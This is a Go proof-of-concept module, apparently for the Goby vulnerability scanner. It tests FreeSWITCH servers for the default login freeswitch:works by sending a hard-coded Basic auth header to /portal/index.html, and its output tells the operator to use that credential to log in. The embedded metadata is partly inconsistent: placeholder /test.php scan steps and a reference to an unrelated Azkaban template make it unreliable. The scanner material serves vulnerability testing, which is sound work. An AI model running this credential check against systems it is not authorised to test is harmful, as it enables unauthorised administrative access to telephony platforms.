package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "FreeSWITCH Default Password",
    "Description": "<p>FreeSWITCH is a cross-platform open source telephone exchange platform with strong scalability. It is designed to provide routing and interconnection communication protocols for audio, video, text or any other form of media. The application has a default password, and attackers can log in to the system to obtain sensitive information.</p>",
    "Product": "FreeSWITCH-Products",
    "Homepage": "https://freeswitch.com/",
    "DisclosureDate": "2022-02-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "header=\"FreeSWITCH\" && title==\"Error 401\"",
    "GobyQuery": "header=\"FreeSWITCH\" && title==\"Error 401\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/default-logins/azkaban/azkaban-default-login.yaml"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "FreeSWITCH 默认口令",
            "Product": "FreeSWITCH-公司产品",
            "Description": "<p>FreeSWITCH的是一个跨平台的开源电话交换平台，具有很强的伸缩性。旨在为音频、视频、文字或任何其他形式的媒体，提供路由和互连通信协议。该应用存在默认口令，攻击者可以登录该系统获取敏感信息。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "两高一弱",
                "默认口令"
            ]
        },
        "EN": {
            "Name": "FreeSWITCH Default Password",
            "Product": "FreeSWITCH-Products",
            "Description": "<p>FreeSWITCH is a cross-platform open source telephone exchange platform with strong scalability. It is designed to provide routing and interconnection communication protocols for audio, video, text or any other form of media. The application has a default password, and attackers can log in to the system to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "2H1W",
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-09-30",
    "Variables": {},
    "PocId": "9957"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/portal/index.html`
		vulInfo := ``

		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		defineHeader := map[string]string{
			"Upgrade-Insecure-Requests": "1",
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
			"Accept-Encoding":           "gzip, deflate",
			"Cache-Control":             "max-age=0",
			"Authorization":             "Basic ZnJlZXN3aXRjaDp3b3Jrcw==",
		}
		urlget := "/portal/index.html"
		resp, err := setGetRequest(hostInfo, urlget, defineHeader)
		if err != nil {
			return false, vulInfo, vulPath
		}
		if resp.StatusCode == 200 {
			vulInfo = "freeswitch:works"
			return true, vulInfo, vulPath
		}
		return false, vulInfo, vulPath
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
